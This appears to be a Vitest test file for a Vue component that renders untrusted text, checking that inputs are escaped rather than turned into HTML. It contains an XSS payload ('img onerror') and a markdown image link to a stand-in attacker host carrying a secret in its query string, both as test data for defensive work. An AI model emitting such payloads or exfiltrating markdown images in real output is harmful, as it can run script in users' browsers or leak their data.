import { describe, expect, it } from 'vitest'
import { mount } from '@vue/test-utils'
import UntrustedText from '~/components/common/UntrustedText.vue'

describe('UntrustedText', () => {
  it('renders injection payloads as literal text', () => {
    const wrapper = mount(UntrustedText, {
      props: { text: '<img src=x onerror=alert(1)>' },
      global: { stubs: { Button: true } },
    })
    expect(wrapper.html()).toContain('&lt;img src=x onerror=alert(1)&gt;')
    expect(wrapper.html()).not.toContain('<img src=x')
  })

  it('does not turn markdown images into tags', () => {
    const wrapper = mount(UntrustedText, {
      props: { text: '![x](https://attacker.tld/?q=secret)' },
      global: { stubs: { Button: true } },
    })
    expect(wrapper.text()).toContain('![x](https://attacker.tld/?q=secret)')
    expect(wrapper.html()).not.toContain('<img')
  })
})
